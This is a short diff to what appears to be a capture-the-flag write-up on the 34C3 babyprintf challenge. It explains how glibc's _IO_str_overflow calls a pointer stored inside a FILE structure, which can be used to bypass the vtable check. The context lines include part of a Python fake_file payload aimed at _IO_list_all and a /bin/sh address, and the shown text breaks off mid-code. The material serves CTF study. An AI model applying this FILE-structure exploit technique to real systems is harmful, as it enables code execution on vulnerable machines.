@@ -2,6 +2,12 @@
 babyprintf shows a way to bypass vtable check.
 Another way can be seen [here](http://blog.rh0gue.com/2017-12-31-34c3ctf-300/)
 
+In _IO_str_overflow:
+v5=[fp+0x38]
+v6=[fp+0x40]-v5
+v7=2*v6+100
+v6<=v7
+call [fp+0xe0](arg: v7)
 ```python
 fake_file = p64(0) + p64(0x61) + p64(0xdeadbeef) + p64(io_list_all-0x10)
 fake_file += p64(0xffffffffffffff) + p64(0)*3 + p64((binsh_addr-100)/2)
